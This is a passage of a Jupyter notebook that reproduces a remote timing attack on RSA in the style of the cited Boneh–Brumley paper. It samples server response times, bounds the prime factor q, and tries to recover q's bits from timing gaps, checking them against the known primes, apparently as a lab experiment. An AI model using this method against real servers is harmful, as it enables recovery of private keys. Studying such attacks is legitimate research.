       "14                  0.836370  \n",
       "15                  0.854552  \n",
       "16                  0.872734  \n",
       "17                  0.890916  \n",
       "18                  0.909098  \n",
       "19                  0.927280  \n",
       "20                  0.945462  \n",
       "21                  0.963644  \n",
       "22                  0.981826  \n",
       "23                  1.000008  \n",
       "24                  1.018190  \n",
       "25                  1.036372  \n",
       "26                  1.054554  \n",
       "27                  1.072736  \n",
       "28                  1.090918  \n",
       "29                  1.109099  \n",
       "30                  1.127281  \n",
       "31                  1.145463  "
      ]
     },
     "execution_count": 60,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sqrt_N = sympy.sqrt(N)\n",
    "samples['point_relative_to_sqrt_n'] = samples['neighbourhood'].apply(lambda g: round(float(g/sqrt_N), 10))\n",
    "samples"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 61,
   "metadata": {},
   "outputs": [],
   "source": [
    "q_relative_to_sqrt_n = round(float(q/sqrt_N), 10)\n",
    "p_relative_to_sqrt_n = round(float(p/sqrt_N), 10)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now plot the media response time as we vary `g`:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 62,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(2535291.115, 2592107.2075, 5681.6092499999795)"
      ]
     },
     "execution_count": 62,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "smallest_time_observed = samples['time'].min()\n",
    "largest_time_observed = samples['time'].max()\n",
    "\n",
    "buffer = (largest_time_observed - smallest_time_observed)/10\n",
    "\n",
    "smallest_time_observed, largest_time_observed, buffer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 63,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<seaborn.axisgrid.FacetGrid at 0x7f4fefe96310>"
      ]
     },
     "execution_count": 63,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1152x576 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "g = seaborn.relplot(data=samples, x='point_relative_to_sqrt_n', y='time', kind='line', height=8, aspect=16/8, marker=\"X\")\n",
    "g.set(ylim=(smallest_time_observed-buffer, largest_time_observed+buffer))\n",
    "g"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 64,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<seaborn.axisgrid.FacetGrid at 0x7f4fef45b490>"
      ]
     },
     "execution_count": 64,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1152x576 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "g = seaborn.relplot(data=samples, x='point_relative_to_sqrt_n', y='time', kind='line', height=8, aspect=16/8, marker=\"X\")\n",
    "plt.plot([q_relative_to_sqrt_n, q_relative_to_sqrt_n], [smallest_time_observed*0.9, largest_time_observed*1.1], color='green')\n",
    "plt.plot([p_relative_to_sqrt_n, p_relative_to_sqrt_n], [smallest_time_observed*0.9, largest_time_observed*1.1], color='purple')\n",
    "g.set(ylim=(smallest_time_observed-buffer, largest_time_observed+buffer))\n",
    "g"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 65,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<seaborn.axisgrid.FacetGrid at 0x7f4fef4bb850>"
      ]
     },
     "execution_count": 65,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1152x576 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "g = seaborn.relplot(data=samples, x='point_relative_to_sqrt_n', y='time', kind='line', height=8, aspect=16/8, marker=\"X\")\n",
    "plt.plot([q_relative_to_sqrt_n, q_relative_to_sqrt_n], [smallest_time_observed*0.9, largest_time_observed*1.1], color='green')\n",
    "plt.plot([p_relative_to_sqrt_n, p_relative_to_sqrt_n], [smallest_time_observed*0.9, largest_time_observed*1.1], color='purple')\n",
    "g.set(ylim=(smallest_time_observed-buffer, largest_time_observed+buffer))\n",
    "g.set(xlim=(q_relative_to_sqrt_n*0.9, p_relative_to_sqrt_n*1.1))\n",
    "g"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Bounding our search for `q`\n",
    "\n",
    "`scipy` finds two peaks in the sample set."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "2"
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "peak_indices, _ = scipy.signal.find_peaks(samples['time'])\n",
    "len(peak_indices)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Lets re-plot the above graph with the peaks highlighted:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<seaborn.axisgrid.FacetGrid at 0x7fc635513510>"
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1152x576 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "first_peak_index = peak_indices[0]\n",
    "first_peak = samples.iloc[first_peak_index]\n",
    "\n",
    "second_peak_index = peak_indices[1]\n",
    "second_peak = samples.iloc[second_peak_index]\n",
    "\n",
    "g = seaborn.relplot(data=samples, x='point_relative_to_sqrt_n', y='time', kind='line', height=8, aspect=16/8, marker=\"X\")\n",
    "\n",
    "plt.plot([first_peak['point_relative_to_sqrt_n'], first_peak['point_relative_to_sqrt_n']], [smallest_time_observed-buffer, largest_time_observed+buffer], color='orange')\n",
    "plt.plot([second_peak['point_relative_to_sqrt_n'], second_peak['point_relative_to_sqrt_n']], [smallest_time_observed-buffer, largest_time_observed+buffer], color='orange')\n",
    "\n",
    "g.set(ylim=(smallest_time_observed-buffer, largest_time_observed+buffer))\n",
    "g"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "I'm going to cheat a little and say that the first peak they've detected isn't quite a peak. We could have modified the `find_peaks` call to be more discerning, or fit a KDE to it, but I think its relatively clear the primary peak is the second value they've detected."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0]"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "attack.sympy_integer_to_bits(second_peak['neighbourhood'])[0:12]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "This gives a lower bound on `q`. To get an upper bound on `q`, note the following:\n",
    "  1. $q*p = N$\n",
    "  2. $q < p$\n",
    "\n",
    "From 1. and 2. it follows that $q < \\sqrt{N}$.\n",
    "\n",
    "(Suppose $q >= \\sqrt{N}$, then by 2. $p > \\sqrt{N}$ and so $ q*p > N$ which contradicts 1. Therefore $q < \\sqrt{N}$.)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(10893843943078360143403895311042249978576984729231319619400393673023933274434756918651522867260609034998150884776519916318675029784706588081477339817443328,\n",
       " 11522245995293453226444537667133610590574234209345464522156603069988519317090416103523895551843843150180734266788088596830720220822331432054108383719953516.)"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "lower_bound = second_peak['neighbourhood']\n",
    "upper_bound = sqrt_N.round()\n",
    "\n",
    "lower_bound, upper_bound"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Let's plot these two bounds on the graph:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<seaborn.axisgrid.FacetGrid at 0x7fc634fa58d0>"
      ]
     },
     "execution_count": 18,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1152x576 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "lower_bound_relative_to_sqrt_n = round(float(lower_bound/sqrt_N), 10)\n",
    "upper_bound_relative_to_sqrt_n = round(float(upper_bound/sqrt_N), 10)\n",
    "\n",
    "g = seaborn.relplot(data=samples, x='point_relative_to_sqrt_n', y='time', kind='line', height=8, aspect=16/8, marker=\"X\")\n",
    "\n",
    "plt.plot([lower_bound_relative_to_sqrt_n, lower_bound_relative_to_sqrt_n], [smallest_time_observed-buffer, largest_time_observed+buffer], color='orange')\n",
    "plt.plot([upper_bound_relative_to_sqrt_n, upper_bound_relative_to_sqrt_n], [smallest_time_observed-buffer, largest_time_observed+buffer], color='orange')\n",
    "\n",
    "g.set(ylim=(smallest_time_observed-buffer, largest_time_observed+buffer))\n",
    "g"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Lets consider the bit representations of these two bounds so we can set in stone the first few bits."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Lower Bound: [1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0]\n",
      "Upper Bound: [1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1]\n"
     ]
    }
   ],
   "source": [
    "print(\"Lower Bound:\", attack.sympy_integer_to_bits(lower_bound)[0:12])\n",
    "print(\"Upper Bound:\", attack.sympy_integer_to_bits(upper_bound)[0:12])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "From this we know the first 4 bits of $q$ are `[1, 1, 0, 1]`. \n",
    "\n",
    "Since it is prime, we also know that $q$ is odd, and so its least significant bit is 1. We'll ignore that for now."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# The meat of it"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0 1 N/A N/A N/A\n",
      "Taking 2800 samples for bit 1 set to low...\n",
      "Taking 2800 samples for bit 1 set to high...\n",
      "1 1 895022804 902880151 7857347\n",
      "Taking 2800 samples for bit 2 set to low...\n",
      "Taking 2800 samples for bit 2 set to high...\n",
      "2 0 870678833 924020252 53341419\n",
      "Taking 2800 samples for bit 3 set to low...\n",
      "Taking 2800 samples for bit 3 set to high...\n",
      "3 1 916449698 916569867 120169\n"
     ]
    }
   ],
   "source": [
    "q_bits = attack.sympy_integer_to_bits(q)\n",
    "print(0, q_bits[0], \"N/A\", \"N/A\", \"N/A\")\n",
    "\n",
    "gaps = []\n",
    "for i in range(1, 4):\n",
    "    T_g_low, T_g_high = attack.recover_bit(q_bits, i, N)\n",
    "    gap = abs(T_g_low-T_g_high)\n",
    "    gaps.append(gap)\n",
    "    \n",
    "    print(i, q_bits[i], T_g_low, T_g_high, gap)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Taking 2800 samples for bit 4 set to low...\n",
      "Taking 2800 samples for bit 4 set to high...\n",
      "4 1 883311058 907483188 24172130\n",
      "Taking 2800 samples for bit 5 set to low...\n",
      "Taking 2800 samples for bit 5 set to high...\n",
      "5 0 904493752 921045847 16552095\n",
      "Taking 2800 samples for bit 6 set to low...\n",
      "Taking 2800 samples for bit 6 set to high...\n",
      "6 0 901715124 913533656 11818532\n",
      "Taking 2800 samples for bit 7 set to low...\n",
      "Taking 2800 samples for bit 7 set to high...\n",
      "7 0 914950238 899224595 15725643\n",
      "Taking 2800 samples for bit 8 set to low...\n",
      "Taking 2800 samples for bit 8 set to high...\n",
      "8 1 899674292 897777673 1896619\n",
      "Taking 2800 samples for bit 9 set to low...\n",
      "Taking 2800 samples for bit 9 set to high...\n",
      "9 1 877629815 924628377 46998562\n",
      "Taking 2800 samples for bit 10 set to low...\n",
      "Taking 2800 samples for bit 10 set to high...\n",
      "10 0 904530252 878370102 26160150\n",
      "Taking 2800 samples for bit 11 set to low...\n",
      "Taking 2800 samples for bit 11 set to high...\n",
      "11 0 910954235 912274888 1320653\n",
      "Taking 2800 samples for bit 12 set to low...\n",
      "Taking 2800 samples for bit 12 set to high...\n",
      "12 1 896877709 892953626 3924083\n",
      "Taking 2800 samples for bit 13 set to low...\n",
      "Taking 2800 samples for bit 13 set to high...\n",
      "13 0 890336165 916962304 26626139\n",
      "Taking 2800 samples for bit 14 set to low...\n",
      "Taking 2800 samples for bit 14 set to high...\n",
      "14 0 920198790 906744387 13454403\n",
      "Taking 2800 samples for bit 15 set to low...\n",
      "Taking 2800 samples for bit 15 set to high...\n",
      "15 0 908246396 891597157 16649239\n",
      "Taking 2800 samples for bit 16 set to low...\n",
      "Taking 2800 samples for bit 16 set to high...\n",
      "16 1 924224095 903677855 20546240\n",
      "Taking 2800 samples for bit 17 set to low...\n",
      "Taking 2800 samples for bit 17 set to high...\n",
      "17 0 928396851 941043004 12646153\n",
      "Taking 2800 samples for bit 18 set to low...\n",
      "Taking 2800 samples for bit 18 set to high...\n",
      "18 0 922963577 915592846 7370731\n",
      "Taking 2800 samples for bit 19 set to low...\n",
      "Taking 2800 samples for bit 19 set to high...\n",
      "19 0 907241517 915895745 8654228\n"
     ]
    }
   ],
   "source": [
    "for i in range(4, 20):\n",
    "    T_g_low, T_g_high = attack.recover_bit(q_bits, i, N)\n",
    "    gap = abs(T_g_low-T_g_high)\n",
    "    gaps.append(gap)\n",
    "    \n",
    "    print(i, q_bits[i], T_g_low, T_g_high, gap)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[7857347,\n",
       " 53341419,\n",
       " 120169,\n",
       " 24172130,\n",
       " 16552095,\n",
       " 11818532,\n",
       " 15725643,\n",
       " 1896619,\n",
       " 46998562,\n",
       " 26160150,\n",
       " 1320653,\n",
       " 3924083,\n",
       " 26626139,\n",
       " 13454403,\n",
       " 16649239,\n",
       " 20546240,\n",
       " 12646153,\n",
       " 7370731,\n",
       " 8654228]"
      ]
     },
     "execution_count": 30,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "gaps"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "28665088.5"
      ]
     },
     "execution_count": 39,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "mean_one_gap = (gaps[0] + gaps[2])/2\n",
    "mean_zero_gap = gaps[1]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]"
      ]
     },
     "execution_count": 41,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "[1] + [1 if (abs(gap-mean_one_gap) < abs(gap-mean_zero_gap)) else 0 for gap in gaps]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0]"
      ]
     },
     "execution_count": 24,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "q_bits[0:20]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1]"
      ]
     },
     "execution_count": 29,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "attack.sympy_integer_to_bits(p)[0:20]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "First, we need to know what gaps to consider \"large\" and what gaps to consider \"small\". Since we know the first 3 bits of $q$, take measurements of their zero-one gaps and use those as reference points."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "metadata": {},
   "outputs": [],
   "source": [
    "zero_gaps = []\n",
    "one_gaps = []"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "metadata": {},
   "outputs": [],
   "source": [
    "T_g_low, T_g_high = learn_ith_bit_of_q(q_bits, 1, N, neighbourhood_size=400)\n",
    "one_gaps.append(abs(T_g_low-T_g_high))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "metadata": {},
   "outputs": [],
   "source": [
    "T_g_low, T_g_high = learn_ith_bit_of_q(q_bits, 2, N, neighbourhood_size=400)\n",
    "zero_gaps.append(abs(T_g_low-T_g_high))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "([3620859], [617321])"
      ]
     },
     "execution_count": 45,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "one_gaps, zero_gaps"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "2119090.0"
      ]
     },
     "execution_count": 46,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "midpoint = (sum(one_gaps)/len(one_gaps) + sum(zero_gaps)/len(zero_gaps))/2\n",
    "midpoint"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "So if a gap is below $midpoint$ this implies a value of 1, if its above $midpoint$ this implies a value of 0."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[768620,\n",
       " 2182199,\n",
       " 2324619,\n",
       " 269411,\n",
       " 1898177,\n",
       " 3076555,\n",
       " 2055003,\n",
       " 1270122,\n",
       " 2717880,\n",
       " 2028538,\n",
       " 4886555,\n",
       " 403202,\n",
       " 2126328,\n",
       " 360893,\n",
       " 5574948,\n",
       " 1522366,\n",
       " 3794700,\n",
       " 406081,\n",
       " 6665577,\n",
       " 1063060]"
      ]
     },
     "execution_count": 53,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "zero_one_gaps"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1 768620\n",
      "1 2182199\n",
      "0 2324619\n",
      "1 269411\n",
      "1 1898177\n",
      "0 3076555\n",
      "0 2055003\n",
      "0 1270122\n",
      "1 2717880\n",
      "1 2028538\n",
      "0 4886555\n",
      "0 403202\n",
      "1 2126328\n",
      "0 360893\n",
      "0 5574948\n",
      "0 1522366\n",
      "1 3794700\n",
      "0 406081\n",
      "0 6665577\n",
      "0 1063060\n"
     ]
    }
   ],
   "source": [
    "for i in range(0, 20):\n",
    "    print(correct_q_bits[i], zero_one_gaps[i])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 59,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1 768620\n",
      "1 2182199\n",
      "0 2324619\n",
      "1 269411\n",
      "1 1898177\n",
      "1 3076555\n",
      "1 2055003\n",
      "1 1270122\n",
      "0 2717880\n",
      "1 2028538\n",
      "0 4886555\n",
      "0 403202\n",
      "0 2126328\n",
      "0 360893\n",
      "1 5574948\n",
      "0 1522366\n",
      "1 3794700\n",
      "1 406081\n",
      "0 6665577\n",
      "1 1063060\n"
     ]
    }
   ],
   "source": [
    "correct_p_bits = attack.sympy_integer_to_bits(p)\n",
    "for i in range(0, 20):\n",
    "    print(correct_p_bits[i], zero_one_gaps[i])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## References\n",
    "  - [1] https://crypto.stanford.edu/~dabo/papers/ssl-timing.pdf"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
